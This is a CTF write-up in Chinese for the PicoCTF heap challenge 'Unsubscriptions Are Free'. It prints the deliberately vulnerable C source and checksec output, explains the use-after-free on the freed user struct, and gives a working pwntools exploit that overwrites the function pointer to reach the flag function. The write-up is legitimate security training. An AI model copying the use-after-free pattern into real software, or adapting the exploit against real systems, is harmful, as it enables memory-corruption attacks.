<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - Unsubscriptions Are Free
  #


  Background
  #

Heap Exploitation / Used After Free

  Source code
  #

:::spoiler Source Code
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == &#39;\n&#39;)
			break;
	}
	*line = &#39;\0&#39;;
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There&#39;s also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You&#39;re leaving already(Y/N)?");
	scanf(" %c", &amp;response);
	if(toupper(response)==&#39;Y&#39;){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &amp;choice);
  choice = toupper(choice);
  switch(choice){
	case &#39;S&#39;:
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case &#39;P&#39;:
	user->whatToDo = (void*)p;
	break;
	case &#39;I&#39;:
 	user->whatToDo = (void*)i;
	break;
	case &#39;M&#39;:
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case &#39;L&#39;:
	leaveMessage();
	break;
	case &#39;E&#39;:
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Unsubscriptions Are Free"><meta property="og:description" content='PicoCTF - Unsubscriptions Are Free # Background # Heap Exploitation / Used After Free
Source code # :::spoiler Source Code
#include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <fcntl.h> #include <ctype.h> #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr(){ char buf[FLAG_BUFFER]; FILE *f = fopen("flag.txt","r"); fgets(buf,FLAG_BUFFER,f); fprintf(stdout,"%s\n",buf); fflush(stdout); } char * getsline(void) { getchar(); char * line = malloc(100), * linep = line; size_t lenmax = 100, len = lenmax; int c; if(line == NULL) return NULL; for(;;) { c = fgetc(stdin); if(c == EOF) break; if(--len == 0) { len = lenmax; char * linen = realloc(linep, lenmax *= 2); if(linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if((*line++ = c) == &#39;\n&#39;) break; } *line = &#39;\0&#39;; return linep; } void doProcess(cmd* obj) { (*obj->whatToDo)(); } void s(){ printf("OOP! Memory leak...%p\n",hahaexploitgobrrr); puts("Thanks for subsribing! I really recommend becoming a premium member!"); } void p(){ puts("Membership pending... (There&#39;s also a super-subscription you can also get for twice the price!)"); } void m(){ puts("Account created."); } void leaveMessage(){ puts("I only read premium member messages but you can "); puts("try anyways:"); char* msg = (char*)malloc(8); read(0, msg, 8); } void i(){ char response; puts("You&#39;re leaving already(Y/N)?"); scanf(" %c", &amp;response); if(toupper(response)==&#39;Y&#39;){ puts("Bye!"); free(user); }else{ puts("Ok. Get premium membership please!"); } } void printMenu(){ puts("Welcome to my stream! ^W^"); puts("=========================="); puts("(S)ubscribe to my channel"); puts("(I)nquire about account deletion"); puts("(M)ake an Twixer account"); puts("(P)ay for premium membership"); puts("(l)eave a message(with or without logging in)"); puts("(e)xit"); } void processInput(){ scanf(" %c", &amp;choice); choice = toupper(choice); switch(choice){ case &#39;S&#39;: if(user){ user->whatToDo = (void*)s; }else{ puts("Not logged in!"); } break; case &#39;P&#39;: user->whatToDo = (void*)p; break; case &#39;I&#39;: user->whatToDo = (void*)i; break; case &#39;M&#39;: user->whatToDo = (void*)m; puts("==========================="); puts("Registration: Welcome to Twixer!"); puts("Enter your username: "); user->username = getsline(); break; case &#39;L&#39;: leaveMessage(); break; case &#39;E&#39;: exit(0); default: puts("Invalid option!"); exit(1); break; } } int main(){ setbuf(stdout, NULL); user = (cmd *)malloc(sizeof(user)); while(1){ printMenu(); processInput(); //if(user){ doProcess(user); //} } return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>PicoCTF - Unsubscriptions Are Free | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Unsubscriptions Are Free</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---unsubscriptions-are-free>PicoCTF - Unsubscriptions Are Free
<a class=anchor href=#picoctf---unsubscriptions-are-free>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Heap Exploitation / Used After Free</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;ctype.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define FLAG_BUFFER 200
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define LINE_BUFFER_SIZE 20
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>	uintptr_t (<span style=color:#f92672>*</span>whatToDo)();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>username;
</span></span><span style=display:flex><span>} cmd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> choice;
</span></span><span style=display:flex><span>cmd <span style=color:#f92672>*</span>user;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hahaexploitgobrrr</span>(){
</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>char</span> buf[FLAG_BUFFER];
</span></span><span style=display:flex><span> 	FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span> 	fgets(buf,FLAG_BUFFER,f);
</span></span><span style=display:flex><span> 	fprintf(stdout,<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,buf);
</span></span><span style=display:flex><span> 	fflush(stdout);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>getsline</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>	getchar();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> line <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>100</span>), <span style=color:#f92672>*</span> linep <span style=color:#f92672>=</span> line;
</span></span><span style=display:flex><span>	size_t lenmax <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>, len <span style=color:#f92672>=</span> lenmax;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> c;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(line <span style=color:#f92672>==</span> NULL)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(;;) {
</span></span><span style=display:flex><span>		c <span style=color:#f92672>=</span> fgetc(stdin);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(c <span style=color:#f92672>==</span> EOF)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#f92672>--</span>len <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>			len <span style=color:#f92672>=</span> lenmax;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> linen <span style=color:#f92672>=</span> realloc(linep, lenmax <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(linen <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>				free(linep);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			line <span style=color:#f92672>=</span> linen <span style=color:#f92672>+</span> (line <span style=color:#f92672>-</span> linep);
</span></span><span style=display:flex><span>			linep <span style=color:#f92672>=</span> linen;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>((<span style=color:#f92672>*</span>line<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> c) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#f92672>*</span>line <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> linep;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doProcess</span>(cmd<span style=color:#f92672>*</span> obj) {
</span></span><span style=display:flex><span>	(<span style=color:#f92672>*</span>obj<span style=color:#f92672>-&gt;</span>whatToDo)();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>s</span>(){
</span></span><span style=display:flex><span> 	printf(<span style=color:#e6db74>&#34;OOP! Memory leak...%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,hahaexploitgobrrr);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Thanks for subsribing! I really recommend becoming a premium member!&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>p</span>(){
</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;Membership pending... (There&#39;s also a super-subscription you can also get for twice the price!)&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>m</span>(){
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Account created.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>leaveMessage</span>(){
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;I only read premium member messages but you can &#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;try anyways:&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> msg <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, msg, <span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>i</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> response;
</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;You&#39;re leaving already(Y/N)?&#34;</span>);
</span></span><span style=display:flex><span>	scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>response);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(toupper(response)<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;Y&#39;</span>){
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Bye!&#34;</span>);
</span></span><span style=display:flex><span>		free(user);
</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Ok. Get premium membership please!&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>printMenu</span>(){
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Welcome to my stream! ^W^&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;==========================&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(S)ubscribe to my channel&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(I)nquire about account deletion&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(M)ake an Twixer account&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(P)ay for premium membership&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(l)eave a message(with or without logging in)&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(e)xit&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>processInput</span>(){
</span></span><span style=display:flex><span>  scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
</span></span><span style=display:flex><span>  choice <span style=color:#f92672>=</span> toupper(choice);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span>(choice){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;S&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(user){
</span></span><span style=display:flex><span> 		user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)s;
</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Not logged in!&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;P&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)p;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;I&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)i;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;M&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)m;
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;===========================&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Registration: Welcome to Twixer!&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Enter your username: &#34;</span>);
</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>username <span style=color:#f92672>=</span> getsline();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;L&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	leaveMessage();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;E&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Invalid option!&#34;</span>);
</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	  <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	setbuf(stdout, NULL);
</span></span><span style=display:flex><span>	user <span style=color:#f92672>=</span> (cmd <span style=color:#f92672>*</span>)malloc(<span style=color:#66d9ef>sizeof</span>(user));
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>		printMenu();
</span></span><span style=display:flex><span>		processInput();
</span></span><span style=display:flex><span>		<span style=color:#75715e>//if(user){
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			doProcess(user);
</span></span><span style=display:flex><span>		<span style=color:#75715e>//}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這題該怎麼說呢，有點像是被設計好的問題</p><ol><li>首先觀察整體的file<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file vuln
</span></span><span style=display:flex><span>vuln: ELF 32-bit LSB executable, Intel 80386, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>89699d062dc4f47448ba7c5c03105267c060ce30, not stripped
</span></span><span style=display:flex><span>$ checksec vuln
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Unsubscriptions Are Free/vuln&#39;</span>
</span></span><span style=display:flex><span>    Arch:     i386-32-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
</span></span></code></pre></div>保護機制雖然沒有全開，不過應該是一個heap題</li><li>source code有一個<code>hahaexploitgobrrr</code> function，是print出flag的function所以我們的目標很明確，就是要想辦法踩到這個function，而<code>s()</code>/<code>p()</code>/<code>m()</code>都是無用的資訊</li><li>遇到這種heap的題目，我會先看哪裡有malloc和free，確保幾個簡單的exploitation的可能性，例如uaf或double free之類的，而i function有一個free，是要註銷帳號的功能，但是main function中的<code>doProcess(user);</code>卻持續使用user這個變數，所以這個就是一個典型的UAF漏洞(我也是看了別人的WP<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>後才知道他的題目已經有提示了，一開始是我想的太複雜了)，試想如果一開始我先輸入<code>i</code>，讓程式<code>free(user)</code>，接著他就會執行<code>doProcess(user)</code>也就是user指向的function pointer，如果我們可以拿到被free掉的user這個chunk然後輸入<code>hahaexploitgobrrr</code>這個function的address，那我們就可以拿到flag了</li><li>所以重點來了，要怎麼拿到被free掉的chunk呢?這個程式==也很好心的==幫我們實作了<code>leaveMessage</code>這個function，他會malloc 8 bytes，其實就剛好是user的大小，所以如果要拿8 bytes的chunk他會先到Tcache搜尋，然後給我們寫一些資訊，此時我們就可以寫上<code>hahaexploitgobrrr</code>這個function的address(address的資訊可以透過<code>s</code> function得知)</li><li>綜合以上資訊可以開寫script</li></ol><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./vuln&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># r = remote(&#39;mercury.picoctf.net&#39;, 61817)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;(e)xit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;i&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;You&#39;re leaving already(Y/N)?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Y&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;(e)xit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;s&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;OOP! Memory leak...0x&#39;</span>)
</span></span><span style=display:flex><span>hahaexploitgobrrr_addr <span style=color:#f92672>=</span> int(str(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>7</span>))[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>success(hahaexploitgobrrr_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;(e)xit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;l&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;try anyways:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(p64(hahaexploitgobrrr_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Flag: </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><h2 id=reference>Reference
